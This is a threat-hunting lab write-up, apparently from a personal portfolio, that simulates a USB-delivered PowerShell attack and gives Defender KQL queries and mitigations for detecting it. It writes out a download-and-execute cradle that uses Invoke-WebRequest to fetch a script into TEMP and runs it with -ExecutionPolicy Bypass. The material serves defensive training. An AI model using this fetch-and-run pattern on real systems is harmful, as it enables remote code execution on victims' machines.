# Threat Event (USB Malware Execution via PowerShell)

**USB Device Triggers Malicious PowerShell Invoke-WebRequest Payload**

---

## Pre-steps:

1. **Created PowerShell simulation scripts to mimic malware behavior:**

   * `fake-malware.ps1`: [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/fake-malware.ps1)
   * `malicious-usb-launcher.ps1`: [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/malicious-usb-launcher.ps1)
   * `usb-mount.ps1`: [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-mount.ps1)
   * `usb-unmount.ps1`: [GitHub Link](https://github.com/jason-p-nguyen/threat-hunting-projects/blob/main/usb_malware_execution/scripts/usb-unmount.ps1)

2. **Used `usb-mount.ps1` to simulate USB insertion** by mounting a virtual payload directory `E:\Payload`.

3. **Copied `malicious-usb-launcher.ps1` to E:\Payload** to simulate a weaponized USB.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:

4. **Executed the USB payload (`malicious-usb-launcher.ps1`)**:

   * Script used `Invoke-WebRequest` to download `fake-malware.ps1` from GitHub:

     ```powershell
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/..." -OutFile "$env:TEMP\payload.ps1"
     powershell -ExecutionPolicy Bypass -File "$env:TEMP\payload.ps1"
     ```

5. **Script ran silently**, simulating second-stage execution.

6. **Cleanup actions performed**:

   * Temporary files auto-deleted
   * Simulated attacker unmounted USB with `usb-unmount.ps1`

---

## Tables Used to Detect IoCs:

| **Parameter** | **Description**                                                                                                  |
| ------------- | ---------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceFileEvents                                                                                                 |
| **Info**      | [DeviceFileEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) |
| **Purpose**   | Detect file creation/deletion from USB, and downloaded `.ps1` files to temp folders.                             |

| **Parameter** | **Description**                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceProcessEvents                                                                                                    |
| **Info**      | [DeviceProcessEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **Purpose**   | Detect suspicious PowerShell activity, `-ExecutionPolicy Bypass`, `Invoke-WebRequest`, and script execution.           |

| **Parameter** | **Description**                                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Name**      | DeviceNetworkEvents                                                                                                    |
| **Info**      | [DeviceNetworkEvents Table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
| **Purpose**   | Detect outbound HTTP calls to download remote scripts or payloads.                                                     |

---

## Related Queries:

```kql
// Detect PowerShell execution of scripts after USB insertion
DeviceProcessEvents
| where DeviceName == "fin-w10-wks-8"
| where AccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = AccountName, FileName, FolderPath, ProcessCommandLine

// Detect file creation or deletion in TEMP or USB paths
DeviceFileEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, Account = InitiatingProcessAccountName, InitiatingProcessCommandLine

// Detect outbound connections to malicious or external sources via PowerShell
DeviceNetworkEvents
| where DeviceName == "fin-w10-wks-8"
| where InitiatingProcessAccountName == "jnguyen.admin"
| order by Timestamp desc
| project Timestamp, DeviceName, Account = InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
```

---

## Created By:

* **Author Name**: Jason Nguyen
* **Author Contact**: [https://github.com/jason-p-nguyen](https://github.com/jason-p-nguyen)
* **Date**: July 3, 2025

---

## Additional Notes:

* USB-based attacks remain a common method for **initial access** or **insider delivery**, especially in red team exercises and physical breach scenarios.
* PowerShell-based payloads are often used for **stealthy execution**, **fileless attacks**, or **remote payload staging**.
* Consider applying the following mitigations:

  * Disable `Invoke-WebRequest` and `IEX` in user PowerShell sessions
  * Enforce signed scripts only (`AllSigned` execution policy)
  * Monitor for USB mount events and autorun behavior
  * Use device control software to restrict USB access

---

## Revision History:

| **Version** | **Changes**   | **Date**     | **Modified By** |
| ----------- | ------------- | ------------ | --------------- |
| 1.0         | Initial draft | July 1, 2025 | Jason Nguyen    |
